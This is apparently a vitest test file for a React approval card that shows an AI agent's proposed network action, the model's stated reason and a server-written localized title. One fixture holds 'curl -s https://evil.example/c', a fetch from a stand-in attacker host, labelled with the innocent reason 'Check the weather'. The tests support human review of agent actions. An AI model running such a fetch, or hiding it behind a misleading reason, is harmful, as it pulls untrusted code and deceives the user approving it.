// SMART-8 (#689 review 3): a network card's title is the command's plain purpose in the user's language, written by
// the server; under the model's line it is the server's own words, and it is no longer marked as English.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, render, screen } from "@testing-library/react";

vi.mock("react-i18next", () => ({
  useTranslation: () => ({ t: (k: string, o?: Record<string, unknown>) => (o ? `${k}:${JSON.stringify(o)}` : k) }),
}));

import AskSlot from "../components/AskSlot";
import { useArslanStore, initialArslanState } from "../stores/arslanStore";

beforeEach(() => { useArslanStore.setState(initialArslanState(), true); });
afterEach(() => cleanup());
const frame = (f: Record<string, unknown>) => act(() => { useArslanStore.getState().handleFrame(f as never); });

describe("the network card", () => {
  it("shows the model's line, and under it the server's title in the user's language, not marked English", () => {
    render(<AskSlot send={vi.fn()} />);
    frame({ type: "propose_action", call_id: "n1", kind: "network", target: "network:*", detail: "curl -s https://evil.example/c",
            title: "会联网 · 从 evil.example 下载", why: "Check the weather", options: ["task"] });
    expect(screen.getByTestId("action-title")).toHaveTextContent("Check the weather");
    expect(screen.getByTestId("action-subject")).toHaveTextContent("会联网 · 从 evil.example 下载");
    expect(screen.getByTestId("action-subject")).not.toHaveAttribute("lang");
  });

  it("a kind whose title is still the server's English keeps the mark", () => {
    render(<AskSlot send={vi.fn()} />);
    frame({ type: "propose_action", call_id: "n2", kind: "brand_new_kind", target: "x", detail: "",
            title: "Let it do the thing?", why: "Do the thing", options: ["task"] });
    expect(screen.getByTestId("action-subject")).toHaveAttribute("lang", "en");
  });
});
